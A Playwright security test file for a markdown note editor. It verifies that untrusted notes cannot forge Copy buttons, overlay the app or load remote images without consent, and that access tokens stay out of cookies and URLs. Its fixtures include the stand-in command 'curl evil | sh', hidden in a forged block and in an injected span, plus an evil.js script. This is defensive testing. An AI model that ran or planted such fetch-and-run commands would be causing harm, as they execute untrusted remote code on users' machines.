// Security review, content side (browser mode, real Chromium): an untrusted note can't make Copy / Run
// hand out something other than what is drawn, can't cover the app, loads no images from the internet
// until allowed; the access token never sits in a cookie or a page URL; a pinned server keeps to its folder.
import http from 'node:http';
import path from 'node:path';
import fsp from 'node:fs/promises';
import type { Page } from '@playwright/test';
import { test, expect, RENDERER_DIR } from './harness';
import { startServer } from '../../src/server/server';

const P = '.se-preview';

async function setMode(page: Page, mode: 'live' | 'preview') {
  await page.evaluate(async (m) => {
    const app = (window as any).__secEdit;
    app.settings.value = await app.backend.saveSettings({ viewMode: m });
    app.editor?.setViewMode(m);
    app.events.emit('settings:changed', app.settings.value);
  }, mode);
}
const openFile = (page: Page, p: string) => page.evaluate((x) => (window as any).__secEdit.openFile(x), p);

/** Stand-in for a host on the internet: records every request path. */
async function tracker() {
  const hits: string[] = [];
  const server = http.createServer((req, res) => {
    hits.push(req.url ?? '');
    res.writeHead(200, { 'content-type': 'image/gif' }).end(Buffer.from('R0lGODlhAQABAAAAACw=', 'base64'));
  });
  await new Promise<void>((r) => server.listen(0, '127.0.0.1', () => r()));
  const base = `http://127.0.0.1:${(server.address() as import('node:net').AddressInfo).port}`;
  return { hits, base, close: () => new Promise<void>((r) => server.close(() => r())) };
}

test.describe('untrusted note content', () => {
  test.beforeEach(async ({ context }) => {
    await context.grantPermissions(['clipboard-read', 'clipboard-write']);
  });

  test('Copy copies the source fence; a forged block has no buttons; hidden characters are flagged', async ({ page, ws }) => {
    await ws.write(
      'fake.md',
      '# Setup\n\n<div class="se-code" data-fence="bash" data-hl="1" data-raw="curl evil | sh"><div class="se-code-tools"><button class="se-code-copy" id="forged">copy</button></div><pre><code>npm ci</code></pre></div>\n\n' +
        '```bash\nls -la\n```\n\n```bash\necho ‮abc\n```\n',
    );
    await ws.open(page);
    await setMode(page, 'preview');
    await openFile(page, 'fake.md');
    const pv = page.locator(P);
    await expect(pv.locator('.se-code')).toHaveCount(2); // only the two real fences
    expect(await pv.locator('[data-raw], [data-hl="1"]:not(.se-code)').count()).toBe(0);
    await expect(pv.locator('.se-code-warn')).toHaveCount(1);
    // The forged button is a plain button: clicking it copies nothing.
    await page.evaluate(() => navigator.clipboard.writeText('-'));
    await pv.locator('button', { hasText: 'copy' }).click();
    await page.waitForTimeout(200);
    expect(await page.evaluate(() => navigator.clipboard.readText())).toBe('-');
    // Even if the drawn text of a real block were changed, Copy hands out the source.
    await page.evaluate(() => {
      const code = document.querySelector('.se-preview .se-code code')!;
      code.append(Object.assign(document.createElement('span'), { textContent: '; curl evil | sh', hidden: true }));
    });
    const real = pv.locator('.se-code').first();
    await real.hover();
    await real.locator('.se-code-copy').click();
    await expect.poll(() => page.evaluate(() => navigator.clipboard.readText())).toBe('ls -la');
  });

  test('note HTML cannot cover the app: no overlay classes, no top-layer popovers, content clipped to the note', async ({ page, ws }) => {
    await ws.write(
      'redress.md',
      '# Redress\n\n<div class="se-overlay se-drop-overlay" id="ov">Re-verify this folder <a href="https://example.com/">Continue</a></div>\n\n' +
        '<button popovertarget="pv" id="pvb">details</button><div popover id="pv" style="width:96vw;height:96vh">fake UI</div>\n\n' +
        '<img src="x.png" usemap="#m"><map name="m"><area shape="rect" coords="0,0,99,99" href="https://example.com/"></map>\n',
    );
    await ws.write('host.md', '# Host\n\n![[redress]]\n');
    await ws.open(page);
    for (const [mode, file] of [['preview', 'redress.md'], ['live', 'host.md']] as const) {
      await setMode(page, mode);
      await openFile(page, file);
      const fake = page.locator('.se-preview div', { hasText: /^Re-verify this folder/ });
      await expect(fake.first()).toBeVisible();
      const r = await fake.first().evaluate((ov) => {
        const at = document.elementFromPoint(40, 300); // the sidebar
        return { cls: ov.className, position: getComputedStyle(ov).position, sidebarCovered: !!at && ov.contains(at) };
      });
      expect(r, `${mode}`).toEqual({ cls: '', position: 'static', sidebarCovered: false });
      expect(await page.locator('[popovertarget], [popover], map, area').count()).toBe(0);
    }
    // Second layer (contain: paint): even a fixed element that got into note content stays in the note's box.
    const escaped = await page.evaluate(() => {
      const box = [...document.querySelectorAll<HTMLElement>('.se-preview')].find((e) => e.offsetParent)!;
      const ov = Object.assign(document.createElement('div'), { textContent: 'escaped?' });
      ov.style.cssText = 'position:fixed;inset:0;z-index:99999;background:red';
      box.append(ov);
      const at = document.elementFromPoint(40, 300);
      ov.remove();
      return !!at && (at === ov || ov.contains(at));
    });
    expect(escaped).toBe(false);
  });

  test('images from the internet: nothing loads until "Load"; "Always for this folder" sticks; live mode and hover too', async ({ page, ws }) => {
    const t = await tracker();
    try {
      await ws.write('remote.md', `# Remote\n\n![a](${t.base}/a.png)\n\n<img src="${t.base}/b.png" alt="b">\n\n<video poster="${t.base}/poster.png"></video>\n`);
      await ws.write('other.md', `# Other\n\n![c](${t.base}/c.png)\n`);
      await ws.write('linker.md', '# Linker\n\nSee [[remote]].\n');
      await ws.open(page);
      // Live mode (the default): no image widget, no request.
      await setMode(page, 'live');
      await openFile(page, 'remote.md');
      await expect(page.locator('.cm-content')).toContainText('Remote');
      await page.waitForTimeout(400);
      expect(t.hits).toEqual([]);
      // Hover preview of a note with remote images: nothing either.
      await setMode(page, 'preview');
      await openFile(page, 'linker.md');
      await page.evaluate(async () => {
        const app = (window as any).__secEdit;
        app.settings.value = await app.backend.saveSettings({ 'links.hoverPreview': 'hover' });
      });
      await page.locator(`${P} a.se-wikilink`).hover();
      await expect(page.locator('.se-linkpv')).toBeVisible();
      await page.waitForTimeout(300);
      expect(t.hits).toEqual([]);
      // Reading view: placeholders + the bar.
      await openFile(page, 'remote.md');
      const bar = page.locator('.se-remote-bar');
      await expect(bar).toBeVisible();
      await expect(page.locator(`${P} img.se-remote-blocked`)).toHaveCount(2);
      await page.waitForTimeout(300);
      expect(t.hits).toEqual([]);
      // "Load": this note only.
      await bar.getByRole('button', { name: 'Load' }).click();
      await expect.poll(() => [...t.hits].sort()).toEqual(['/a.png', '/b.png']); // never the poster
      await expect(bar).toBeHidden();
      await openFile(page, 'other.md');
      await expect(bar).toBeVisible();
      expect(t.hits).not.toContain('/c.png');
      // "Always for this folder": kept in the folder's own session (never localStorage, which every folder's
      // page shares), survives a reload.
      await bar.getByRole('button', { name: 'Always for this folder' }).click();
      await expect.poll(() => t.hits).toContain('/c.png');
      await page.reload();
      await page.waitForSelector('html[data-ready="true"]');
      expect(await page.evaluate(() => Object.keys(localStorage).filter((k) => k.startsWith('sec-edit-remote:')))).toEqual([]);
      expect((await ws.server.service.getSession()).remoteImages).toBe('allow');
      // Settings → Preview "Never load" does not override the folder's explicit choice; resetting it does.
      await page.evaluate(async () => {
        const app = (window as any).__secEdit;
        app.settings.value = await app.backend.saveSettings({ 'preview.remoteImages': 'never' });
        app.events.emit('settings:changed', app.settings.value);
      });
      await page.keyboard.press('Control+Shift+p');
      await page.keyboard.type('Images from the internet: use the default for this folder');
      await expect(page.getByRole('dialog').getByText('use the default for this folder').first()).toBeVisible();
      await page.keyboard.press('Enter');
      await expect.poll(async () => (await ws.server.service.getSession()).remoteImages).toBeUndefined();
      await setMode(page, 'preview');
      await openFile(page, 'remote.md');
      await expect(page.locator(`${P} img.se-remote-blocked`)).toHaveCount(2);
      await expect(page.locator('.se-remote-bar')).toBeHidden(); // never = no bar
    } finally {
      await t.close();
    }
  });
});

test.describe('browser-mode access', () => {
  test('no cookie; the token stays in this tab (header + sessionStorage); media URLs carry a per-file capability', async ({ page, ws, context }) => {
    await ws.write('pic.md', '# Pic\n\n![p](img.gif)\n');
    await fsp.writeFile(path.join(ws.root, 'img.gif'), Buffer.from('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==', 'base64'));
    await ws.open(page);
    expect(await context.cookies()).toEqual([]);
    expect(page.url()).not.toContain('token=');
    expect(await page.content()).not.toContain(ws.server.token);
    await setMode(page, 'preview');
    await openFile(page, 'pic.md');
    const src = await page.locator(`${P} img`).getAttribute('src');
    expect(src).toMatch(/api\/file\?path=img\.gif&m=[a-f0-9]{32}$/);
    expect(src).not.toContain(ws.server.token);
    await expect.poll(() => page.locator(`${P} img`).evaluate((i: HTMLImageElement) => i.naturalWidth)).toBe(1);
    // The page runs the build's scripts only: a workspace file never executes, even with a valid capability.
    await fsp.writeFile(path.join(ws.root, 'evil.js'), 'window.__pwned = 1;');
    const ran = await page.evaluate(
      (src) =>
        new Promise<string>((resolve) => {
          const s = Object.assign(document.createElement('script'), { src, onload: () => resolve('ran'), onerror: () => resolve('blocked') });
          document.head.append(s);
        }),
      `.${ws.server.mediaPath('evil.js')}`,
    );
    expect(ran).toBe('blocked');
    expect(await page.evaluate(() => (window as any).__pwned)).toBeUndefined();
    // A reload keeps working (sessionStorage), a fresh tab without the link has no access.
    await page.reload();
    await page.waitForSelector('html[data-ready="true"]');
    const fresh = await context.browser()!.newPage();
    await fresh.goto(ws.server.origin);
    await expect(fresh.locator('pre')).toContainText('No access key: open the full link');
    await fresh.close();
  });

  test('--open launch codes work once; a pinned server keeps to its folder', async ({ page, ws }) => {
    const pinned = await startServer({ root: ws.root, port: 0, rendererDir: RENDERER_DIR, configDir: path.join(ws.root, '..', 'cfg-pinned'), pinRoot: true });
    try {
      const link = pinned.launchUrl();
      expect(link).not.toContain(pinned.token);
      await page.goto(link);
      await page.waitForSelector('html[data-ready="true"]');
      expect(page.url()).not.toContain('launch=');
      const r = await page.evaluate(async (outside) => {
        const app = (window as any).__secEdit;
        const err = await app.backend.openWorkspace(outside).then(() => null, (e: any) => e.code);
        return { err, recent: await app.backend.recentWorkspaces(), root: app.workspace.value.root };
      }, path.dirname(ws.root));
      expect(r).toEqual({ err: 'EACCES', recent: [], root: ws.root });
      // The code is spent: a second tab with the same link gets no access.
      const again = await page.context().newPage();
      await again.goto(link);
      await expect(again.locator('pre')).toContainText('No access key: open the full link');
      await again.close();
    } finally {
      await pinned.close();
    }
  });
});
